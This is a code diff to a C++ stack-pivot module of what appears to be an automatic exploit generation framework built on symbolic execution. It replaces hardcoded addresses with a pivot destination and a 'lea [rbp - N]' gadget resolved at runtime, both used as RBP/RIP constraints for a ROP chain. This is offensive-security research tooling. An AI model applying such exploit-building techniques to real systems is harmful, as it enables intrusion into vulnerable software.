@@ -122,21 +122,29 @@ void AdvancedStackPivot::initialize() {
     assert(__dynRop && "AdvancedStackPivot relies on DynamicRop module");
     auto &dynRop = *__dynRop;
 
-    ref<Expr> rbp1 = ConstantExpr::create(0x404830, Expr::Int64);
-    ref<Expr> rip1 = ConstantExpr::create(0x40112e, Expr::Int64);
+    // Resolve ret2LeaRbp.
+    // XXX: from balsn: this is a good research topic.
+    const auto &readCallSiteInfo = *m_readCallSites.rbegin();
+    int rbpOffset = 0;
+    uint64_t ret2LeaRbp = determineRetAddr(readCallSiteInfo.address, rbpOffset);
+    uint64_t pivotDest = g_crax->getExploit().getSymbolValue("pivot_dest");
+
+    ref<Expr> rbp1 = ConstantExpr::create(pivotDest, Expr::Int64);
+    ref<Expr> rip1 = ConstantExpr::create(ret2LeaRbp, Expr::Int64);
 
     dynRop.addConstraint(DynamicRop::RegisterConstraint { Register::X64::RBP, rbp1 })
         .addConstraint(DynamicRop::RegisterConstraint { Register::X64::RIP, rip1 })
         .scheduleConstraints();
 
-    ref<Expr> rbp2 = ConstantExpr::create(0x404830 + 8 + 32, Expr::Int64);
-    ref<Expr> rip2 = ConstantExpr::create(0x40112e, Expr::Int64);
+    ref<Expr> rbp2 = ConstantExpr::create(pivotDest + 8 + rbpOffset, Expr::Int64);
+    ref<Expr> rip2 = ConstantExpr::create(ret2LeaRbp, Expr::Int64);
 
     dynRop.addConstraint(DynamicRop::RegisterConstraint { Register::X64::RBP, rbp2 })
         .addConstraint(DynamicRop::RegisterConstraint { Register::X64::RIP, rip2 })
         .scheduleConstraints();
 
-    g_crax->setShowInstructions(true);
+    // For debugging convenience, you may uncomment the following line :^)
+    //g_crax->setShowInstructions(true);
 
     // At this point, the exploit generator is already running.
     // This is our last chance to stop it. This method will throw a
@@ -244,19 +252,39 @@ void AdvancedStackPivot::beforeExploitGeneration(S2EExecutionState *state) {
     m_offsetToRetAddr = rsp - readCallSiteInfo.buf - 16;
 }
 
-uint64_t AdvancedStackPivot::determineRetAddr(uint64_t readCallSiteAddr) const {
+uint64_t AdvancedStackPivot::determineRetAddr(uint64_t readCallSiteAddr,
+                                              int &rbpOffset) const {
     std::string symbol = g_crax->getBelongingSymbol(readCallSiteAddr);
     log<WARN>() << hexval(readCallSiteAddr) << " is within " << symbol << "\n";
 
     std::vector<Instruction> insns = disas().disasm(symbol);
     uint64_t ret = 0;
 
+    // Look for any instruction like lea rax, [rbp - 0x20]
+    // If we can find one, return the instruction's offset
+    // (relative to ELF base), and copy 0x20 into the `rbpOffset` argument.
     for (int i = insns.size() - 2; i >= 0; i--) {
-        if (insns[i].opStr.find("rbp") != std::string::npos) {
-            ret = insns[i].address;
-            break;
+        static const std::string keyword = "[rbp - ";
+        const std::string &target = insns[i].opStr;
+        size_t j = 0;
+
+        if (target.back() != ']') {
+            continue;
         }
+
+        j = target.find(keyword);
+        if (j == std::string::npos) {
+            continue;
+        }
+
+        std::string strOffset = target.substr(j + keyword.size());
+        strOffset.pop_back();  // remove the trailing ']'
+
+        ret = insns[i].address;
+        rbpOffset = std::stoi(strOffset, nullptr, 16);
+        break;
     }
+
     assert(ret && "determineReturnAddr(): no suitable candidates?");
     return ret - g_crax->getExploit().getElf().getBase();
 }
